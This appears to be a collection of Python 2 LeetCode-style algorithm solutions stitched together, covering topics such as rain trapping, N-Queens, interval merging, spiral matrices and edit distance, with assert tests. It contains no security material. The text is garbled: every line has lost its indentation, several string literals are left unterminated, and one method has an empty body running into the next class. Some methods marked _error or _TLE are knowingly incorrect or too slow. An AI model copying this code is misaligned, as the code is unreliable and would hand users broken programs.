for ind, val in enumerate(A):
volume += max(0, min(left_maxs[ind], right_maxs[ind]) - val)
return volume
if __name__=="__main__":
print Solution().trap([0, 1, 0, 2, 1, 0, 1, 3, 2, 1, 2, 1])
class Solution(object):
def multiply(self, num1, num2):
result = []
if len(num1) > len(num2):
return self.multiply(num2, num1)
num1 = map(int, list(num1[::-1]))
num2 = map(int, list(num2[::-1]))
for d in num1:
result.append(self.multiply_1_digit(d, num2))
lst = self.add_list(result)
lst.reverse()
result = "".join(map(str, lst)).lstrip("0")
if not result:
return "0"
return result
def multiply_1_digit(self, digit, num):
ret = []
carry = 0
for elt in num:
mul = elt*digit + carry
carry = mul/10
mul %= 10
ret.append(mul)
if carry != 0:
ret.append(carry)
return ret
def add_list(self, lst):
sig = 0
ret = [0]
for ind, val in enumerate(lst):
for i in xrange(sig): val.insert(0, 0)
ret = self.add(ret, val)
sig += 1
return ret
def add(self, num1, num2):
if len(num1) > len(num2):
return self.add(num2, num1)
ret = []
carry = 0
for idx in xrange(len(num2)):
try:
sm = num1[idx] + num2[idx] + carry
except IndexError:
sm = num2[idx] + carry
carry = sm/10
ret.append(sm % 10)
if carry != 0:
ret.append(carry)
return ret
if __name__ == "__main__":
solution = Solution()
assert [1, 2] == solution.add([2, 1], [9])
assert str(123*999) == solution.multiply("123", "999")
assert str(0) == solution.multiply("0", "0")
assert str(123*456) == solution.multiply("123", "456")
class Solution:
def isMatch_MLE(self, s, p):
tape = s
pattern = p
m = len(tape)
n = len(pattern)
dp = [[False for _ in xrange(n+1)] for _ in xrange(m+1)]
dp[m][n] = True
for j in xrange(n-1, -1 , -1):
if pattern[j]=="*":
dp[m][j] = dp[m][j+1]
for i in xrange(m-1, -1, -1):
for j in xrange(n-1, -1, -1):
if tape[i]==pattern[j] or pattern[j]=="?":
dp[i][j] = dp[i+1][j+1]
elif pattern[j]=="*":
dp[i][j] = dp[i][j+1] or dp[i+1][j]
else:
dp[i][j] = False
return dp[0][0]
def isMatch_forward(self, s, p):
tape = s
pattern = p
m = len(tape)
n = len(pattern)
if n - list(pattern).count("*") > m:
return False
dp = [False for _ in xrange(m+1)]
dp[0] = True
for j in xrange(1, n+1):
if pattern[j-1]=="*":
k = 0
while k<m+1 and dp[k]!=True: k+= 1
for i in xrange(k, m+1):
dp[i] = True
else:
for i in xrange(m, 0, -1):
dp[i] = dp[i-1] and (tape[i-1]==pattern[j-1] or pattern[j-1]=="?")
dp[0] = dp[0] and pattern[j-1]=="*"
return dp[m]
if __name__=="__main__":
assert Solution().isMatch("aab", "c*a*b")==False
assert Solution().isMatch("aa","a")==False
assert Solution().isMatch("aa", "aa")==True
assert Solution().isMatch("aaa", "aa")==False
assert Solution().isMatch("aaa", "*")==True
assert Solution().isMatch("aa", "a*")==True
assert Solution().isMatch("ab", "?*")==True
class Solution:
def jump_TLE(self, A):
if not A:
return 0
length = len(A)
counter = 0
dp = [[] for _ in A]
q = []
q.append(0)
while q:
current_level = q
q = []
for ind in current_level:
if ind>=length-1:
return counter
for j in xrange(ind+1, ind+A[ind]+1):
if j not in current_level:
q.append(j)
counter += 1
return counter
def jump(self, A):
length = len(A)
counter = 0
start = 0
end = 1
gmax = 0
while end<length:
if not start<end: return 0
for i in xrange(start, end):
gmax = max(gmax, A[i]+i)
counter += 1
start = end
end = gmax+1
return counter
if __name__=="__main__":
print Solution().jump([3, 2, 1, 0, 4])
assert Solution().jump([2,3,1,1,4])==2
class Solution:
def permute(self, num):
result = []
self.get_permute(num, [], result)
return result
def get_permute(self, seq, current, result):
length = len(seq)
if length==0:
result.append(current)
for ind, val in enumerate(seq):
self.get_permute(seq[:ind]+seq[ind+1:], current+[val], result)
if __name__=="__main__":
print Solution().permute([1, 2, 3])
class Solution:
def permuteUnique_TLE(self, num):
result = []
self.get_permute(num, [], result)
return map(list, set(map(tuple, result)))
def get_permute_TLE(self, nums, current, result):
length = len(nums)
if length==0:
result.append(current)
for ind, val in enumerate(nums):
self.get_permute(nums[:ind]+nums[ind+1:], current+[val], result)
def permuteUnique(self, num):
result = []
num.sort()
self.get_permute(num, [], result)
return result
def get_permute(self, nums, current, result):
if not nums:
result.append(current)
for ind, val in enumerate(nums):
if ind-1>=0 and val==nums[ind-1]: continue
self.get_permute(nums[:ind]+nums[ind+1:], current+[val], result)
if __name__=="__main__":
print Solution().permuteUnique([1, 1, 2])
class Solution:
def rotate(self, matrix):
n = len(matrix)
for row in range(n):
for col in range(n-row):
matrix[row][col], matrix[n-1-col][n-1-row] = matrix[n-1-col][n-1-row], matrix[row][col]
for row in range(n/2):
for col in range(n):
matrix[row][col], matrix[n-1-row][col] = matrix[n-1-row][col], matrix[row][col]
return matrix
class Solution:
def pow(self, x, n):
invert_flag = False if n > 0 else True
n = abs(n)
product = 1.0
while n > 0:
if n & 1 == 1:
product *= x
n = n >> 1
x *= x
if invert_flag:
product = 1.0 / product
return product
def pow_TLE(self, x, n):
if abs(x)<=0.00001:
return 0
if x==1.0:
return 1
if x==-1.0:
if n&1==1:
return 1
else:
return -1
if abs(x-1.0)<1e-6:
return 1+(x-1.0)*n
if abs(x--1.0)<1e-6:
if n % 2==0:
return self.pow(-x, n)
else:
return -self.pow(-x, n)
product = 1.0
for i in xrange(abs(n)):
pre = product
if n>0:
product *= x
else:
product /= x
if abs(product - pre)<1e-5:
break
return product
if __name__=="__main__":
print Solution().pow(8.88023, 3)
class Solution:
def anagrams_complicated(self, strs):
temp = list(strs)
for ind, string in enumerate(temp):
if string and string!="":
string = [char for char in string]
string.sort()
string = "".join(string)
temp[ind] = string
hash_map = {}
for ind, string in enumerate(temp):
indexes = hash_map.get(string, [])
indexes.append(ind)
hash_map[string] = indexes
result = []
for val in hash_map.values():
if len(val)>1:
result += [strs[i] for i in val]
return result
def anagrams(self, strs):
hash_map = {}
for ind, string in enumerate(strs):
string = "".join(sorted(string))
if string not in hash_map:
hash_map[string] = [ind]
else:
hash_map[string].append(ind)
result = []
for val in hash_map.values():
if len(val)>1:
result += [strs[i] for i in val]
return result
if __name__=="__main__":
Solution().anagrams(["", ""])
INVALID = -1
QUEEN = 1
DEFAULT = 0
directions = [(+1, +1), (-1, -1), (-1, +1), (+1, -1)]
class Solution:
def solveNQueens(self, n):
result = []
current = [[0 for _ in xrange(n)] for _ in xrange(n)]
self.backtrack(0, current, result)
return self.transform2string(result)
def backtrack(self, queen_index, current, result):
n = len(current)
if queen_index==n:
result.append(current)
return
for i in xrange(n):
if current[queen_index][i]==INVALID:
continue
new_config = [list(element) for element in current]
new_config[queen_index][i] = QUEEN
for m in xrange(n):
if new_config[m][i]==DEFAULT:
new_config[m][i] = INVALID
if new_config[queen_index][m]==DEFAULT:
new_config[queen_index][m] = INVALID
for direction in directions:
row = queen_index+direction[0]*m
col = i+direction[1]*m
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT:
new_config[row][col] = INVALID
self.backtrack(queen_index+1, new_config, result)
def transform2string(self, result):
string_result = []
for configuration in result:
current = []
for row in configuration:
row = map(lambda x: "." if x==-1 else "Q", row)
row = "".join(row)
current.append(row)
string_result.append(current)
return string_result
if __name__=="__main__":
assert Solution().solveNQueens(4)==[['.Q..', '...Q', 'Q...', '..Q.'], ['..Q.', 'Q...', '...Q', '.Q..']]
INVALID = -1
QUEEN = 1
DEFAULT = 0
class Solution:
def totalNQueens(self, n):
result = []
current = [[0 for _ in xrange(n)] for _ in xrange(n)]
self.backtrack(0, current, result)
return len(result)
def backtrack(self, queen_index, current, result):
n = len(current)
if queen_index==n:
result.append(current)
return
for i in xrange(n):
if current[queen_index][i]==INVALID:
continue
new_config = [list(element) for element in current]
new_config[queen_index][i] = QUEEN
for m in xrange(n):
if new_config[m][i]==DEFAULT:
new_config[m][i] = INVALID
if new_config[queen_index][m]==DEFAULT:
new_config[queen_index][m] = INVALID
row = queen_index+m
col = i+m
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID
row = queen_index-m
col = i-m
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID
row = queen_index-m
col = i+m
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID
row = queen_index+m
col = i-m
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID
self.backtrack(queen_index+1, new_config, result)
if __name__=="__main__":
print Solution().totalNQueens(4)
class Solution:
def maxSubArray(self, A):
if not A:
return 0
largest = max(A)
if largest<0:
return largest
max_result = -1<<31
current_max = 0
for i in range(len(A)):
if current_max+A[i]>=0:
current_max+=A[i]
else:
current_max = 0
max_result = max(max_result, current_max)
return max_result
class Solution:
def spiralOrder(self, matrix):
if not matrix or not matrix[0]:
return matrix
result = []
left = 0
right = len(matrix[0]) - 1
top = 0
bottom = len(matrix) - 1
while left <= right and top <= bottom:
for c in xrange(left, right + 1):
result.append(matrix[top][c])
for r in xrange(top + 1, bottom + 1):
result.append(matrix[r][right])
for c in xrange(right - 1, left - 1, -1):
if top < bottom:
result.append(matrix[bottom][c])
for r in xrange(bottom - 1, top, -1):
if left < right:
result.append(matrix[r][left])
left += 1
right -= 1
top += 1
bottom -= 1
return result
if __name__=="__main__":
print Solution().spiralOrder([[2, 3]])
class Solution:
def canJump_TLE(self, A):
length = len(A)
dp = [set([index]) for index in range(length)]
for ind, val in enumerate(A):
if ind!=0 and len(dp[ind])<2:
continue
for i in xrange(ind+1, ind+val+1):
if i>=length:
break
for item in dp[ind]:
dp[i].add(item)
return 0 in dp[-1]
def canJump_TLE2(self, A):
l = len(A)
dp = [False for _ in xrange(l+1)]
dp[0] = True
for ind, val in enumerate(A):
if dp[ind]:
for i in xrange(1, val+1):
if ind+i<l+1:
dp[ind+i] = True
else:
break
return dp[-1]
def canJump(self, A):
l = len(A)
if l<=1:
return True
dp = [-1 for _ in xrange(l)]
dp[0] = A[0]+0
for i in xrange(1, l):
if dp[i-1]>=l-1:
return True
if dp[i-1]<i:
return False
dp[i] = max(dp[i-1], A[i]+i)
return False
if __name__=="__main__":
assert Solution().canJump([2, 3, 1, 1, 4])==True
assert Solution().canJump([3, 2, 1, 0, 4])==False
class Interval(object):
def __init__(self, s=0, e=0):
self.start = s
self.end = e
class Solution(object):
def merge(self, itvls):
if not itvls:
return []
itvls.sort(key=lambda x: x.start)
ret = [itvls[0]]
for cur in itvls[1:]:
pre = ret[-1]
if cur.start <= pre.end:
pre.end = max(pre.end, cur.end)
else:
ret.append(cur)
return ret
def merge_error(self, itvls):
if not itvls:
return []
ret = [itvls[0]]
for interval in itvls[1:]:
if ret[-1].end < interval.start:
ret.append(interval)
continue
if ret[-1].start <= interval.start <= ret[-1].end <= interval.end:
ret[-1].end = interval.end
continue
if interval.start <= ret[-1].start and ret[-1].end <= interval.end:
ret[-1] = interval
continue
if ret[-1].start <= interval.start < ret[-1].end and ret[-1].start <= interval.end < ret[-1].end:
ret.append(interval)
continue
if interval.start < ret[-1].start <= interval.end < ret[-1].end:
ret[-1].start = interval.start
continue
if interval.end < ret[-1].start:
ret.append(ret)
continue
return ret
class Solution:
def lengthOfLastWord(self, s):
s = s.strip()
lst = s.split(" ")
try:
last_word = lst[-1]
return len(last_word)
except IndexError:
return 0
class Interval(object):
def __init__(self, s=0, e=0):
self.start = s
self.end = e
def __str__(self):
return "[%d, %d]" % (self.start, self.end)
def __repr__(self):
return repr(self.__str__())
class Solution(object):
def insert(self, itvls, newItvl):
s, e = newItvl.start, newItvl.end
left = filter(lambda x: x.end < s, itvls)
right = filter(lambda x: x.start > e, itvls)
if len(left)+len(right) != len(itvls):
s = min(s, itvls[len(left)].start)
e = max(e, itvls[-len(right)-1].end)
return left + [Interval(s, e)] + right
def insert_itr(self, itvls, newItvl):
class SolutionSlow(object):
def insert(self, itvls, newItvl):
return self.merge(itvls+[newItvl])
def merge(self, itvls):
itvls.sort(cmp=lambda a, b: a.start - b.start)
ret = [itvls[0]]
for cur in itvls[1:]:
pre = ret[-1]
if cur.start <= pre.end:
pre.end = max(pre.end, cur.end)
else:
ret.append(cur)
return ret
if __name__ == "__main__":
lst = [[1, 2], [3, 5], [6, 7], [8, 10], [12, 16]]
insert = [4, 9]
lst_interval = []
for item in lst:
lst_interval.append(Interval(item[0], item[1]))
print Solution().insert(lst_interval, Interval(insert[0], insert[1]))
class Solution:
def generateMatrix(self, n):
left = 0
right = n - 1
top = 0
bottom = n - 1
result = [[-1 for _ in xrange(n)] for _ in xrange(n)]
num = 1
while left <= right and top <= bottom:
for i in xrange(left, right + 1):
result[top][i] = num
num += 1
for i in xrange(top + 1, bottom):
result[i][right] = num
num += 1
for i in xrange(right, left, -1):
result[bottom][i] = num
num += 1
for i in xrange(bottom, top, -1):
result[i][left] = num
num += 1
left += 1
right -= 1
top += 1
bottom -= 1
return result
class SolutionError:
def generateMatrix(self, n):
left = 0
right = n - 1
top = 0
bottom = n - 1
result = [[-1 for _ in xrange(n)] for _ in xrange(n)]
num = 1
while left <= right and top <= bottom:
for i in xrange(left, right):
result[top][i] = num
num += 1
for i in xrange(top, bottom):
result[i][right] = num
num += 1
for i in xrange(right, left, -1):
result[bottom][i] = num
num += 1
for i in xrange(bottom, top, -1):
result[i][left] = num
num += 1
left += 1
right -= 1
top += 1
bottom -= 1
return result
if __name__=="__main__":
result = Solution().generateMatrix(4)
for row in result:
print row
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
class Solution:
def rotateRight(self, head, k):
if not head:
return None
dummy = ListNode(0)
dummy.next = head
length = 0
pre = dummy
while pre.next:
length += 1
pre = pre.next
last = pre
k = k%length
count = 0
pre = dummy
while count<length-k:
count += 1
pre = pre.next
if k!=0:
pre.next, dummy.next, last.next = None, pre.next, dummy.next
return dummy.next
if __name__=="__main__":
length = 1
lst = [ListNode(i+1) for i in xrange(length)]
for i in range(length-1):
lst[i].next = lst[i+1]
Solution().rotateRight(lst[0], 1)
import math
class Solution(object):
def getPermutation(self, n, k):
k -= 1
array = range(1, n+1)
k %= math.factorial(n)
ret = []
for i in xrange(n-1, -1, -1):
idx, k = divmod(k, math.factorial(i))
ret.append(array.pop(idx))
return "".join(map(str, ret))
def getPermutation(self, n, k):
fac = [1 for _ in xrange(n)]
for i in xrange(1, n):
fac[i] = fac[i-1]*i
k -= 1
a = [0 for _ in xrange(n)]
for i in xrange(n-1, -1, -1):
a[n-1-i] = k/fac[i]
k %= fac[i]
candidate = range(1, n+1)
visited = [False for _ in xrange(n)]
for ind, val in enumerate(a):
i = 0
cnt = 0
while True:
if visited[i]:
i += 1
else:
if cnt == val: break
cnt += 1
i += 1
a[ind] = candidate[i]
visited[i] = True
return "".join(map(str, a))
def getPermutation_complicated(self, n, k):
k -= 1
factorial = 1
for i in xrange(1, n):
factorial *= i
result = []
array = range(1, n+1)
for i in reversed(xrange(1, n)):
index = k/factorial
result.append(array[index])
array = array[:index]+array[index+1:]
k = k%factorial
factorial /= i
result.append(array[0])
return "".join(str(element) for element in result)
class Solution_TLE:
def __init__(self):
self.counter = 0
def getPermutation(self, n, k):
if not n:
return
sequence = range(1, n+1)
result = self.get_kth_permutation_dfs(sequence, k, [])
return "".join(str(element) for element in result)
def get_kth_permutation_dfs(self, remaining_seq, k, cur):
if not remaining_seq:
self.counter += 1
if self.counter == k:
return cur
for ind, val in enumerate(remaining_seq):
result = self.get_kth_permutation_dfs(remaining_seq[:ind]+remaining_seq[ind+1:], k, cur+[val])
if result: return result
if __name__ == "__main__":
assert Solution().getPermutation(4, 6) == "1432"
assert Solution().getPermutation(2, 2) == "21"
assert Solution().getPermutation(3, 1) == "123"
assert Solution().getPermutation(3, 5) == "312"
print Solution().getPermutation(9, 171669)
import math
class Solution(object):
def uniquePaths(self, m, n):
m -= 1
n -= 1
return math.factorial(m+n) / (math.factorial(n) * math.factorial(m))
def uniquePathsDP(self, m, n):
F = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
F[1][0] = 1
for i in xrange(1, m+1):
for j in xrange(1, n+1):
F[i][j] = F[i-1][j] + F[i][j-1]
return F[m][n]
def uniquePathsNormal(self, m, n):
F = [[0 for _ in xrange(n)] for _ in xrange(m)]
F[0][0] = 1
for i in xrange(m):
for j in xrange(n):
if i == 0 and j == 0: continue
if i == 0: F[i][j] = F[i][j-1]
elif j == 0: F[i][j] = F[i-1][j]
else: F[i][j] = F[i-1][j]+F[i][j-1]
return F[m-1][n-1]
if __name__ == "__main__":
assert Solution().uniquePaths(3, 7) == 28
class Solution:
def minPathSum(self, grid):
if not grid:
return 0
row_cnt = len(grid)
col_cnt = len(grid[0])
dp = [[1<<31 for _ in xrange(col_cnt)] for _ in xrange(row_cnt)]
for i in xrange(row_cnt):
for j in xrange(col_cnt):
if i==0 and j==0:
dp[i][j] = grid[i][j]
elif i==0:
dp[i][j] = dp[i][j-1]+grid[i][j]
elif j==0:
dp[i][j] = dp[i-1][j]+grid[i][j]
else:
dp[i][j] = min(dp[i-1][j], dp[i][j-1])+grid[i][j]
return dp[row_cnt-1][col_cnt-1]
class Solution:
def uniquePathsWithObstacles(self, obstacleGrid):
m = len(obstacleGrid)
n = len(obstacleGrid[0])
if obstacleGrid[0][0]==1 or obstacleGrid[m-1][n-1]==1:
return 0
path = [[0 for _ in range(n)] for _ in range(m)]
path[0][0] = 1
for i in range(m):
for j in range(n):
if i==0 and j==0:
continue
if i==0:
path[i][j] = path[i][j-1] if obstacleGrid[i][j-1]==0 else 0
elif j==0:
path[i][j] = path[i-1][j] if obstacleGrid[i-1][j]==0 else 0
else:
if obstacleGrid[i][j-1]==0 and obstacleGrid[i-1][j]==0:
path[i][j] = path[i-1][j]+path[i][j-1]
elif obstacleGrid[i][j-1]==0:
path[i][j] = path[i][j-1]
elif obstacleGrid[i-1][j]==0:
path[i][j] = path[i-1][j]
else:
path[i][j]=0
return path[m-1][n-1]
if __name__=="__main__":
grid = [[0, 0], [1, 1], [0, 0]]
assert Solution().uniquePathsWithObstacles(grid)==0
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
def __str__(self):
return "%d, %s"%(self.val, self.next)
class Solution:
def mergeTwoLists(self, l1, l2):
dummy = ListNode(0)
dummy.next = l1
pre = dummy
the_other = l2
while pre and pre.next:
cur = pre.next
if the_other and cur.val>the_other.val:
temp = the_other.next
pre.next, the_other.next = the_other, cur
the_other = temp
pre = pre.next
if the_other:
pre.next = the_other
return dummy.next
if __name__=="__main__":
length = 10
list1 = [ListNode(2*i) for i in xrange(length)]
list2 = [ListNode(2*i+1) for i in xrange(length)]
for i in xrange(length-1):
list1[i].next = list1[i+1]
list2[i].next = list2[i+1]
lst = Solution().mergeTwoLists(list1[0], list2[0])
print lst
class Solution(object):
def plusOne(self, digits):
for i in xrange(len(digits)-1, -1, -1):
digits[i] += 1
if digits[i] < 10:
return digits
else:
digits[i] -= 10
digits.insert(0, 1)
return digits
def plusOne(self, digits):
digits.reverse()
digits[0] += 1
carry = 0
for i in xrange(len(digits)):
digits[i] += carry
if digits[i] > 9:
digits[i] -= 10
carry = 1
else:
carry = 0
break
if carry:
digits.append(1)
digits.reverse()
return digits
if __name__ == "__main__":
digits = [9]
assert Solution().plusOne(digits) == [1, 0]
class Solution:
def isNumber_builtin(self, s):
try:
float(s)
return True
except ValueError:
return False
def isNumber(self, s):
INVALID = 0
SPACE = 1
SIGN = 2
DIGIT = 3
DOT = 4
E = 5
T = [
[-1, 0, 3, 1, 2,-1],
[-1, 8,-1, 1, 4, 5],
[-1,-1,-1, 4,-1,-1],
[-1,-1,-1, 1, 2,-1],
[-1, 8,-1, 4,-1, 5],
[-1,-1, 6, 7,-1,-1],
[-1,-1,-1, 7,-1,-1],
[-1, 8,-1, 7,-1,-1],
[-1, 8,-1,-1,-1,-1],
]
state = 0
for char in s:
if state==-1:
return False
if char==" ":
token = SPACE
elif char in ("-", "+"):
token = SIGN
elif char in map(str, range(10)):
token = DIGIT
elif char==".":
token = DOT
elif char in ("e", "E"):
token = E
else:
token = INVALID
state = T[state][token]
if state in (1, 4, 7, 8):
return True
else:
return False
if __name__=="__main__":
assert Solution().isNumber(".2e81")==True
assert Solution().isNumber("6+1")==False
assert Solution().isNumber("1 a")==False
assert Solution().isNumber("1e10")==True
assert Solution().isNumber(" 0.1")==True
assert Solution().isNumber("abc")==False
class Solution:
def addBinary_builtin(self, a, b):
a = int(a, 2)
b = int(b, 2)
return bin(a+b)[2:]
def addBinary(self, a, b):
if len(a)>len(b):
a, b = b, a
a, b = list(a), list(b)
a.reverse()
b.reverse()
for i in xrange(len(a)):
if a[i]=="0":
continue
elif b[i]=="0":
b[i] = "1"
continue
else:
b[i] = "0"
if i==len(b)-1:
b.append("1")
else:
for j in range(i+1, len(b)):
if b[j]=="0":
b[j] = "1"
break
else:
b[j] = "0"
if j==len(b)-1:
b.append("1")
break
b.reverse()
return "".join(b)
if __name__=="__main__":
print Solution().addBinary("11", "1")
class Solution(object):
def simplifyPath(self, path):
path = path.split("/")
path = filter(lambda x: x not in ("", " ", "."), path)
for idx in xrange(len(path)):
val = path[idx]
if val == "..":
path[idx] = "."
i = idx-1
while i >= 0 and path[i] == ".": i -= 1
if i >= 0: path[i] = "."
path = filter(lambda x: x not in (".",), path)
if not path:
return "/"
path = map(lambda x: "/"+x, path)
return "".join(path)
if __name__ == "__main__":
assert Solution().simplifyPath("/a/./b///../c/../././../d/..//../e/./f/./g/././//.//h///././/..///") == "/e/f/g"
assert Solution().simplifyPath("/a/./b/../../c/") == "/c"
assert Solution().simplifyPath("/../") == "/
from typing import List
class Solution:
def fullJustify(self, words: List[str], maxWidth: int) -> List[str]:
ret = []
char_cnt = 0
cur_words = []
for w in words:
cur_words.append(w)
char_cnt += len(w)
if char_cnt + len(cur_words) - 1 > maxWidth:
cur_words.pop()
char_cnt -= len(w)
for i in range(maxWidth - char_cnt):
cur_words[i % max(1, len(cur_words) - 1)] += " "
ret.append("".join(cur_words))
cur_words = [w]
char_cnt = len(w)
last = " ".join(cur_words)
ret.append(last + " " * (maxWidth - len(last)))
return ret
class Solution2:
def fullJustify(self, words: List[str], maxWidth: int) -> List[str]:
ret = []
char_cnt = 0
cur_words = []
for w in words:
if char_cnt + len(w) + len(cur_words) > maxWidth:
for i in range(maxWidth - char_cnt):
cur_words[i % max(1, len(cur_words) - 1)] += " "
ret.append("".join(cur_words))
cur_words = []
char_cnt = 0
cur_words.append(w)
char_cnt += len(w)
last = " ".join(cur_words)
ret.append(last + " " * (maxWidth - len(last)))
return ret
if __name__ == "__main__":
assert Solution().fullJustify(["This", "is", "an", "example", "of", "text", "justification."], 16) == ["This    is    an","example  of text","justification.  "]
assert Solution().fullJustify(["What","must","be","acknowledgment","shall","be"], 16) == ["What   must   be","acknowledgment  ","shall be        "]
class Solution:
def climbStairs_save_memory(self, n):
f_n_minus_2 = 1
f_n_minus_1 = 2
if n==1: return f_n_minus_2
if n==2: return f_n_minus_1
fn = 0
for i in range(2, n):
fn = f_n_minus_1 +f_n_minus_2
f_n_minus_2 = f_n_minus_1
f_n_minus_1 = fn
return fn
def climbStairs(self, n):
if n==1: return 1
if n==2: return 2
f = [0 for _ in xrange(n+1)]
f[0] = 0
f[1] = 1
f[2] = 2
for i in xrange(3, n+1):
f[i] = f[i-1]+f[i-2]
return f[n]
if __name__=="__main__":
print Solution().climbStairs(3)
class Solution:
def fullJustify(self, words, L):
result = []
self.break_line(words, L, result)
return self.distribute_space(L, result)
def break_line(self, words, L, result):
if not words:
return
cur_length = -1
lst = []
i = 0
while i<len(words):
word = words[i]
cur_length += 1
cur_length += len(word)
if cur_length>L: break
lst.append(word)
i += 1
result.append(lst)
self.break_line(words[i:], L, result)
def distribute_space(self, L, result):
new_result = []
for ind, line in enumerate(result):
word_cnt = len(line)
str_builder = []
space_cnt = L-sum(len(word) for word in line)
hole_cnt = word_cnt-1
if ind<len(result)-1:
if hole_cnt>0:
space = space_cnt/hole_cnt
remain = space_cnt%hole_cnt
for word in line[:-1]:
str_builder.append(word)
str_builder.append(" "*space)
if remain>0:
str_builder.append(" ")
remain -= 1
str_builder.append(line[-1])
else:
str_builder.append(line[-1])
str_builder.append(" "*space_cnt)
else:
str_builder = [" ".join(line)]
str_builder.append(" "*(space_cnt-hole_cnt))
new_result.append("".join(str_builder))
return new_result
if __name__=="__main__":
print Solution().fullJustify(["This", "is", "an", "example", "of", "text", "justification."], 16)
print Solution().fullJustify(["What","must","be","shall","be."], 12)
class Solution:
def sqrt(self, x):
if x==0: return 0
m = x
while True:
m_before = m
m = m - float(m*m-x)/(2*m)
if abs(m-m_before)<1e-7: break
return int(m)
if __name__=="__main__":
print Solution().sqrt(2)
class Solution:
def minDistance(self, word1, word2):
m = len(word1)
n = len(word2)
d = [[-1 for _ in xrange(n+1)] for _ in xrange(m+1)]
for i in xrange(m+1):
d[i][0] = i
for j in xrange(n+1):
d[0][j] = j
for i in xrange(1, m+1):
for j in xrange(1, n+1):
if word1[i-1]==word2[j-1]:
d[i][j] = d[i-1][j-1]
else:
d[i][j]= min(
d[i-1][j]+1,
d[i][j-1]+1,
d[i-1][j-1]+1
)
return d[-1][-1]
class Solution:
def setZeroes_error(self, matrix):
if not matrix:
return
m = len(matrix)
n = len(matrix[0])
for row in xrange(m):
for col in xrange(n):
if matrix[row][col]==0:
matrix[0][col]=0
matrix[row][0]=0
for row in xrange(m):
if matrix[row][0]==0:
for col in xrange(n):
matrix[row][col] = 0
for col in xrange(n):
if matrix[0][col]==0:
for row in xrange(m):
matrix[row][col] = 0
def setZeroes(self, matrix):
if not matrix:
return
m = len(matrix)
n = len(matrix[0])
clear_first_row = False
clear_first_col = False
for row in xrange(m):
if matrix[row][0]==0:
clear_first_col = True
for col in xrange(n):
if matrix[0][col]==0:
clear_first_row = True
for row in xrange(1, m):
for col in xrange(1, n):
if matrix[row][col]==0:
matrix[0][col] = 0
matrix[row][0] = 0
for row in xrange(1, m):
if matrix[row][0]==0:
for col in xrange(n):
matrix[row][col] = 0
for col in xrange(1, n):
if matrix[0][col]==0:
for row in xrange(m):
matrix[row][col] = 0
if clear_first_row:
for col in xrange(n):
matrix[0][col] = 0
if clear_first_col:
for row in xrange(m):
matrix[row][0] = 0
class Solution(object):
def searchMatrix(self, mat, target):
if not mat:
return False
m = len(mat)
n = len(mat[0])
lo = 0
hi = m
while lo < hi:
mid = (lo+hi)/2
if mat[mid][0] == target:
return True
elif mat[mid][0] < target:
lo = mid+1
else:
hi = mid
lst = mat[lo-1]
lo = 0
hi = n
while lo < hi:
mid = (lo+hi)/2
if lst[mid] == target:
return True
elif lst[mid] < target:
lo = mid+1
else:
hi = mid
return False
if __name__ == "__main__":
assert Solution().searchMatrix([[1], [3]], 3) == True
class Solution:
def sortColors(self, A):
RED, WHITE, BLUE = 0, 1, 2
red_end_ptr = -1
blue_start_ptr= len(A)
i = 0
while i<blue_start_ptr:
if A[i]==WHITE:
i += 1
elif A[i]==RED:
red_end_ptr+=1
A[red_end_ptr], A[i] = A[i], A[red_end_ptr]
i += 1
else:
blue_start_ptr -= 1
A[blue_start_ptr], A[i] = A[i], A[blue_start_ptr]
if __name__=="__main__":
Solution().sortColors([1, 2, 0])
import sys
class Solution(object):
def minWindow(self, S, T):
min_win = [0, sys.maxint]
w_cnt = [0 for _ in range(256)]
t_cnt = [0 for _ in range(256)]
for char in T:
t_cnt[ord(char)] += 1
appeared_cnt = 0
lo = 0
for hi in xrange(1, len(S)+1):
val = S[hi-1]
if t_cnt[ord(val)] > 0:
w_cnt[ord(val)] += 1
if t_cnt[ord(val)] > 0 and w_cnt[ord(val)] <= t_cnt[ord(val)]:
appeared_cnt += 1
if appeared_cnt == len(T):
while w_cnt[ord(S[lo])] > t_cnt[ord(S[lo])] or t_cnt[ord(S[lo])] == 0:
if w_cnt[ord(S[lo])] > 0: w_cnt[ord(S[lo])] -= 1
lo += 1
if min_win[1]-min_win[0] > hi-lo:
min_win[0], min_win[1] = lo, hi
if min_win[1] == sys.maxint:
return ""
else:
return S[min_win[0]:min_win[1]]
if __name__ == "__main__":
assert Solution().minWindow("ADOBECODEBANC", "ABC") == "BANC
class Solution:
def exist(self, board, word):
if not board:
return
m = len(board)
n = len(board[0])
visited = [[False for _ in xrange(n)] for _ in xrange(m)]
for i in xrange(m):
for j in xrange(n):
if board[i][j]==word[0]:
visited[i][j] = True
if self.search(board, i, j, word[1:], visited):
return True
visited[i][j] = False
return False
def search(self, board, pre_row, pre_col, word, visited):
if not word:
return True
m = len(board)
n = len(board[0])
next_positions = [(pre_row-1, pre_col), (pre_row+1, pre_col), (pre_row, pre_col-1), (pre_row, pre_col+1)]
for next_position in next_positions:
if 0<=next_position[0]<m and 0<=next_position[1]<n:
if visited[next_position[0]][next_position[1]]==False and board[next_position[0]][next_position[1]]==word[0]:
visited[next_position[0]][next_position[1]] = True
if self.search(board, next_position[0], next_position[1], word[1:], visited):
return True
visited[next_position[0]][next_position[1]] = False
return False
if __name__=="__main__":
board = [
"ABCE",
"SFCS",
"ADEE"
]
word = "ABCCED"
print Solution().exist(board, word)
class Solution:
def subsets(self, S):
S.sort()
result = []
self.generate_subsets(S, [], result)
return result
def generate_subsets(self, S, current, result):
result.append(current)
for ind, val in enumerate(S):
self.generate_subsets(S[ind+1:], current+[val], result)
if __name__=="__main__":
print Solution().subsets([1, 2, 3])
class Solution:
def combine(self, n, k):
result = []
nums = [i+1 for i in xrange(n)]
self.get_combination(k, nums, [], result)
return result
def get_combination(self, k, nums, current, result):
if len(current)==k:
result.append(current)
return
elif len(current)+len(nums)<k:
return
for ind, val in enumerate(nums):
self.get_combination(k, nums[ind+1:], current+[val], result)
if __name__=="__main__":
print Solution().combine(4, 2)
from typing import List
